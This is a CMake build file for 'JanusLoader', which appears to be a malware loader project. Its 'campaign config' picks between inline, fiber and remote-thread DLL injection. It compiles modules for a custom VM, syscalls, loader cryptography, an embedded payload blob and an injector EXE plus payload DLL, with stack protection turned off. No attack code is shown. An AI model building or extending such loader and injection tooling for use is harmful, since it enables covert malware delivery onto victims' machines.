cmake_minimum_required(VERSION 3.20)
project(JanusLoader CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# ── Campaign config ──────────────────────────────────────────────────────────
# Injection technique: 0=inline, 1=fiber, 2=remote_thread (DLL injection)
set(JANUS_INJECT_TECHNIQUE 0 CACHE STRING "Injection technique (0=inline, 1=fiber, 2=remote_thread)")

# ── VM + Loader library ───────────────────────────────────────────────────────
add_library(janus_vm STATIC
    src/vm/core.cpp
    src/vm/alu.cpp
    src/vm/mem.cpp
    src/vm/branch.cpp
    src/vm/system.cpp
    src/syscall/winapi.cpp
    src/syscall/table.cpp
    src/loader/crypto.cpp
    src/loader/loader.cpp
    src/loader/payload_blob.cpp
    src/inject/inline.cpp
    src/inject/fiber.cpp
    src/inject/remote_thread.cpp
)

target_include_directories(janus_vm PUBLIC include)
target_compile_definitions(janus_vm PUBLIC JANUS_INJECT_TECHNIQUE=${JANUS_INJECT_TECHNIQUE})

if (MSVC)
    target_compile_options(janus_vm PRIVATE /O2 /GS- /W4)
    target_compile_definitions(janus_vm PRIVATE _CRT_SECURE_NO_WARNINGS)
else()
    target_compile_options(janus_vm PRIVATE -O2 -Wall -Wextra)
endif()

# ── Targets depend on technique ──────────────────────────────────────────────
if (JANUS_INJECT_TECHNIQUE EQUAL 2)
    # Technique 2: build injector EXE + payload DLL

    add_executable(JanusInjector src/main.cpp)
    target_link_libraries(JanusInjector PRIVATE janus_vm kernel32)

    add_library(JanusPayloadDll SHARED src/inject/dllmain.cpp)
    target_link_libraries(JanusPayloadDll PRIVATE janus_vm kernel32)
    set_target_properties(JanusPayloadDll PROPERTIES OUTPUT_NAME "JanusLoader")
else()
    # Technique 0 or 1: single loader executable
    add_executable(JanusLoader src/main.cpp)
    target_link_libraries(JanusLoader PRIVATE janus_vm kernel32)
endif()

# ── Build payload separately ──────────────────────────────────────────────────
# cd payload && cmake -B build -DCMAKE_TOOLCHAIN_FILE=../cmake/riscv64.cmake && cmake --build build
